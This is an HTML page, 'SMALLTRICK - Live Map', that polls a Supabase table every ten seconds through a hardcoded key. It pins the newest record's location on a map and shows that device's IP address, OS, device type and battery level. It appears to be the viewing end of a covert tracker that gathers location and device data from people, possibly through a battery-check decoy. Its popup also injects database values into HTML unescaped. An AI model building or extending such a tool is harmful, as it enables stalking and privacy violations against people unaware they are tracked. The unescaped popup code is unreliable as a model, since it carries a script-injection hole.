<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📡 SMALLTRICK - Live Map</title>
    <!-- CSS Leaflet -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        /* styling dasar */
        body { margin: 0; padding: 0; font-family: monospace; background: #0a0a0f; color: #00ff41; }
        #map { height: 80vh; width: 100%; }
        #info { padding: 15px; background: #1a1a2e; border-bottom: 1px solid #00ff4133; }
        #info span { color: #8888aa; }
    </style>
</head>
<body>
    <div id="info">
        📍 <span id="location-info">Klik marker untuk detail</span>
    </div>
    <div id="map"></div>

    <!-- JS Leaflet -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // ============================================================
        // 🔥 KONFIGURASI SUPABASE
        // ============================================================
        const SUPABASE_URL = 'https://fjjdbvyqqpshaxgqavnx.supabase.co';
        const SUPABASE_ANON_KEY = 'sb_publishable_FGhSQDZF4jZGniE1F3RPrA_3i57aI4p';       


        // Inisialisasi peta dengan center default (Indonesia)
        const map = L.map('map').setView([-6.2, 106.8], 5);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap'
        }).addTo(map);

        let marker = null; // variabel untuk marker

        async function loadData() {
            try {
                const res = await fetch(
                    `${SUPABASE_URL}/rest/v1/battery_data?order=created_at.desc&limit=1`,
                    {
                        headers: {
                            'apikey': SUPABASE_ANON_KEY,
                            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
                        }
                    }
                );
                const data = await res.json();

                if (data.length > 0 && data[0].latitude && data[0].longitude) {
                    const row = data[0];
                    const lat = row.latitude;
                    const lon = row.longitude;

                    // Update info
                    document.getElementById('location-info').textContent = 
                        `${row.location || 'Lokasi'} | IP: ${row.ip_address || 'Tidak diketahui'}`;

                    // Hapus marker lama jika ada
                    if (marker) map.removeLayer(marker);

                    // Tambahkan marker baru
                    marker = L.marker([lat, lon]).addTo(map)
                        .bindPopup(`
                            <b>📍 ${row.location || 'Tidak diketahui'}</b><br>
                            IP: ${row.ip_address || '-'}<br>
                            Device: ${row.device_type || '-'}<br>
                            OS: ${row.os_name || '-'}<br>
                            Battery: ${row.battery_level || '-'}
                        `)
                        .openPopup();

                    // Pindahkan peta ke lokasi marker
                    map.setView([lat, lon], 13);
                } else {
                    document.getElementById('location-info').textContent = 'Belum ada data lokasi.';
                }
            } catch (e) {
                console.error('Error:', e);
                document.getElementById('location-info').textContent = 'Gagal memuat data.';
            }
        }

        // Jalankan pertama kali
        loadData();

        // Refresh otomatis setiap 10 detik
        setInterval(loadData, 10000);
    </script>
</body>
</html>
